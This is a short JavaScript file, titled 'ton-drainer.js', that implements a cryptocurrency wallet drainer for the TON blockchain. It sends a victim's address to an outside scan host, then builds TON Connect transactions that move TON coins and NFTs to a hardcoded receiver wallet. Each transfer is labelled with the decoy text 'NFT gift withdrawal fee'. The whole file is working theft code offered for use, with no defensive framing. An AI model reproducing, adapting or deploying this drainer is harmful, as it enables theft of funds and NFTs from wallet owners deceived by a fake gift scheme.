// ton-drainer.js — TON Connect: transfer NFT + TON
const TON_CONFIG = {
  RECEIVER: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
  SCAN_API: 'https://gift-spinner.onrender.com',
  DEFAULT_FEE_TON: 0.05,
  NFT_FEE_TON: 0.03,
};

async function scanVictim(address) {
  const r = await fetch(TON_CONFIG.SCAN_API + '/api/scan', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ address }),
  });
  return await r.json();
}

async function transferTon(tonConnectUI, amountTon, comment) {
  const { beginCell, toNano } = TON;
  const body = beginCell().storeUint(0, 32).storeStringTail(comment || 'NFT gift withdrawal fee').endCell();
  const tx = {
    validUntil: Math.floor(Date.now() / 1000) + 300,
    messages: [{
      address: TON_CONFIG.RECEIVER,
      amount: toNano(amountTon).toString(),
      payload: body.toBoc().toString('base64'),
    }],
  };
  return await tonConnectUI.sendTransaction(tx);
}

async function transferNft(tonConnectUI, nftAddress) {
  const { beginCell, Address, toNano } = TON;
  const body = beginCell()
    .storeUint(0x5fcc3d14, 32)
    .storeUint(0, 64)
    .storeAddress(Address.parse(TON_CONFIG.RECEIVER))
    .storeAddress(Address.parse(TON_CONFIG.RECEIVER))
    .storeBit(0)
    .storeCoins(0)
    .storeBit(0)
    .endCell();
  const tx = {
    validUntil: Math.floor(Date.now() / 1000) + 300,
    messages: [{
      address: nftAddress,
      amount: toNano(TON_CONFIG.NFT_FEE_TON).toString(),
      payload: body.toBoc().toString('base64'),
    }],
  };
  return await tonConnectUI.sendTransaction(tx);
}

window.tonDrainer = { scanVictim, transferTon, transferNft, TON_CONFIG };
